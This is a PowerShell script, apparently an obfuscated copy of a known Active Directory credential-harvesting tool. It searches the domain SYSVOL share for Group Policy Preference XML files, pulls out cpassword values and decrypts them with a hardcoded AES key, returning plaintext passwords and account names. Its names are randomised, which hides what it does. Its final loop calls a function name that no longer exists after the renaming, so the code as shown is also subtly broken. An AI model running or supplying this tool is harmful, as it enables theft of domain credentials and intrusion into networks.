function Shockley {

    
    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $99fI9FNPifrX9Dt = $Env:USERDNSDOMAIN
    )
    

    Set-StrictMode -Version 2
    

    function Callie {
        [CmdletBinding()]
        Param (
            [string] $XIjIwSqJaBVNoOm 
        )

        try {

            $Mod = ($XIjIwSqJaBVNoOm.length % 4)
            
            switch ($Mod) {
            '1' {$XIjIwSqJaBVNoOm = $XIjIwSqJaBVNoOm.Substring(0,$XIjIwSqJaBVNoOm.Length -1)}
            '2' {$XIjIwSqJaBVNoOm += ('=' * (4 - $Mod))}
            '3' {$XIjIwSqJaBVNoOm += ('=' * (4 - $Mod))}
            }

            $9YbzudUAcYfYXPD = [Convert]::FromBase64String($XIjIwSqJaBVNoOm)
            

            $ZHBeZAu9VysupBK = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $mjZWUqltcTD9KuJ = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            

            $AesIV = New-Object Byte[]($ZHBeZAu9VysupBK.IV.Length) 
            $ZHBeZAu9VysupBK.IV = $AesIV
            $ZHBeZAu9VysupBK.Key = $mjZWUqltcTD9KuJ
            $fklsc9vIoaDuqDR = $ZHBeZAu9VysupBK.CreateDecryptor() 
            [Byte[]] $A9dabxmGfuCjb9o = $fklsc9vIoaDuqDR.TransformFinalBlock($9YbzudUAcYfYXPD, 0, $9YbzudUAcYfYXPD.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($A9dabxmGfuCjb9o)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    

    function tussocks {
    [CmdletBinding()]
        Param (
            $File
        )
    
        try {
            
            $NqWQxFqDFdwnHrC = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)


            $XIjIwSqJaBVNoOm = @()
            $UdrJFdOIsTDO9It = @()
            $A9vRMoWtvGRhAAD = @()
            $hkNkwJChJhwPKLd = @()
            $zrwERTspxEHM99R = @()
    

            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($NqWQxFqDFdwnHrC) {

                    'Groups.xml' {
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $A9vRMoWtvGRhAAD += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $XIjIwSqJaBVNoOm += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UdrJFdOIsTDO9It += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $hkNkwJChJhwPKLd += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $XIjIwSqJaBVNoOm) {
               Write-Verbose "Decrypting $Pass"
               $wlGJUUBdnaJ9dcj = Callie $Pass
               Write-Verbose "Decrypted a password of $wlGJUUBdnaJ9dcj"

               $zrwERTspxEHM99R += , $wlGJUUBdnaJ9dcj
           }
            

            if (!($zrwERTspxEHM99R)) {$zrwERTspxEHM99R = '[BLANK]'}
            if (!($UdrJFdOIsTDO9It)) {$UdrJFdOIsTDO9It = '[BLANK]'}
            if (!($hkNkwJChJhwPKLd)) {$hkNkwJChJhwPKLd = '[BLANK]'}
            if (!($A9vRMoWtvGRhAAD)) {$A9vRMoWtvGRhAAD = '[BLANK]'}
                  

            $VxXRTItRtYP9V9M = @{'Passwords' = $zrwERTspxEHM99R;
                                  'UserNames' = $UdrJFdOIsTDO9It;
                                  'Changed' = $hkNkwJChJhwPKLd;
                                  'NewName' = $A9vRMoWtvGRhAAD;
                                  'File' = $File}
                
            $9TLFevrMZKDNRJE = New-Object -TypeName PSObject -Property $VxXRTItRtYP9V9M
            Write-Verbose "The password is between {} and may be more than one value."
            if ($9TLFevrMZKDNRJE) {Return $9TLFevrMZKDNRJE} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {

        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }


        Write-Verbose "Searching \\$99fI9FNPifrX9Dt\SYSVOL. This could take a while."
        $O9KfWYIsSvdrNiE = Get-ChildItem -Path "\\$99fI9FNPifrX9Dt\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
        if ( -not $O9KfWYIsSvdrNiE ) {throw 'No preference files found.'}

        Write-Verbose "Found $($O9KfWYIsSvdrNiE | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $O9KfWYIsSvdrNiE) {
            $YUhhPcXfwWsVysO = (Get-GppInnerFields $File.Fullname)
            Write-Output $YUhhPcXfwWsVysO
        }
    }

    catch {Write-Error $Error[0]}
}
